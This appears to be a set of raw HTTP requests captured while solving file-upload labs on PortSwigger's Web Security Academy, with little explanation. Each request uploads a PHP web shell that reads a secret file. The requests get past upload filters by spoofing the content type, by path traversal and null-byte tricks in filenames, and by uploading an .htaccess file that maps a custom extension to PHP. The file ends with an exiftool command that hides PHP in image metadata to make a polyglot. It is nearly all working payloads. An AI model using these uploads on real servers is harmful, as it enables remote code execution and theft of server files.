POST /my-account/avatar HTTP/1.1
Host: 0aec001b0344bd55c0d26cc000a80055.web-security-academy.net
Cookie: session=L03384c0RYURB5Xfl41HyyTWxHPwBL0B
Content-Length: 477
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aec001b0344bd55c0d26cc000a80055.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynYk673useyENjk9j
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aec001b0344bd55c0d26cc000a80055.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundarynYk673useyENjk9j
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundarynYk673useyENjk9j
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundarynYk673useyENjk9j
Content-Disposition: form-data; name="csrf"

txmGAdjcoqXBX327evAD6sUMelXmBp4P
------WebKitFormBoundarynYk673useyENjk9j--













POST /my-account/avatar HTTP/1.1
Host: 0aab0010040d6a65c0af168400f40040.web-security-academy.net
Cookie: session=17NneFiObQjCqhRdwEZXNigSZJaGXUzT
Content-Length: 488
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aab0010040d6a65c0af168400f40040.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0BrzMnfeGY9kdKAg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aab0010040d6a65c0af168400f40040.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary0BrzMnfeGY9kdKAg
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fwebshell.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary0BrzMnfeGY9kdKAg
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary0BrzMnfeGY9kdKAg
Content-Disposition: form-data; name="csrf"

HZ8zT06NVNV66efi7e8Xzf4iwXpYmzRu
------WebKitFormBoundary0BrzMnfeGY9kdKAg--















POST /my-account/avatar HTTP/1.1
Host: 0a68001c03b65fe3c17fc9af00410030.web-security-academy.net
Cookie: session=LLZ6VoRs4q8gP1QxXWaaofYufFlvbmuZ
Content-Length: 477
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a68001c03b65fe3c17fc9af00410030.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDSFEh0JFVCvmPlf0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a68001c03b65fe3c17fc9af00410030.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryDSFEh0JFVCvmPlf0
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
------WebKitFormBoundaryDSFEh0JFVCvmPlf0
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryDSFEh0JFVCvmPlf0
Content-Disposition: form-data; name="csrf"

xj3KjIts5dgbWHYUzpmH3ot3qDpWc5NY
------WebKitFormBoundaryDSFEh0JFVCvmPlf0--


HTTP/1.1 403 Forbidden
Date: Wed, 21 Sep 2022 15:22:33 GMT
Server: Apache/2.4.41 (Ubuntu)
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 164

Sorry, php files are not allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">Â« Back to My Account</a></p>


POST /my-account/avatar HTTP/1.1
Host: 0a68001c03b65fe3c17fc9af00410030.web-security-academy.net
Cookie: session=LLZ6VoRs4q8gP1QxXWaaofYufFlvbmuZ
Content-Length: 442
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a68001c03b65fe3c17fc9af00410030.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDSFEh0JFVCvmPlf0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a68001c03b65fe3c17fc9af00410030.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryDSFEh0JFVCvmPlf0
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
------WebKitFormBoundaryDSFEh0JFVCvmPlf0
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryDSFEh0JFVCvmPlf0
Content-Disposition: form-data; name="csrf"

xj3KjIts5dgbWHYUzpmH3ot3qDpWc5NY
------WebKitFormBoundaryDSFEh0JFVCvmPlf0--


POST /my-account/avatar HTTP/1.1
Host: 0a68001c03b65fe3c17fc9af00410030.web-security-academy.net
Cookie: session=LLZ6VoRs4q8gP1QxXWaaofYufFlvbmuZ
Content-Length: 478
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a68001c03b65fe3c17fc9af00410030.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDSFEh0JFVCvmPlf0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a68001c03b65fe3c17fc9af00410030.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryDSFEh0JFVCvmPlf0
Content-Disposition: form-data; name="avatar"; filename="webshell.l33t"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryDSFEh0JFVCvmPlf0
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryDSFEh0JFVCvmPlf0
Content-Disposition: form-data; name="csrf"

xj3KjIts5dgbWHYUzpmH3ot3qDpWc5NY
------WebKitFormBoundaryDSFEh0JFVCvmPlf0--
















POST /my-account/avatar HTTP/1.1
Host: 0af100db04f5606dc02526400075007b.web-security-academy.net
Cookie: session=vbd7HqOQWgNnIoa5h8zSB7FrUWZxItXE
Content-Length: 484
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0af100db04f5606dc02526400075007b.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMDXzpZboe1Xp6FP0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af100db04f5606dc02526400075007b.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryMDXzpZboe1Xp6FP0
Content-Disposition: form-data; name="avatar"; filename="webshell.php%00.jpg"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryMDXzpZboe1Xp6FP0
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryMDXzpZboe1Xp6FP0
Content-Disposition: form-data; name="csrf"

8sjgseth3KCc2Gd8egHdePWeWsw0kVIe
------WebKitFormBoundaryMDXzpZboe1Xp6FP0--










https://exiftool.org/index.html

https://thecyberjedi.com/php-shell-in-a-jpeg-aka-froghopper/

exiftool.exe -Comment="<?php echo 'START' . file_get_contents('/home/carlos/secret') . 'END' ; ?>" C:\path\to\image.png -o polygot.php










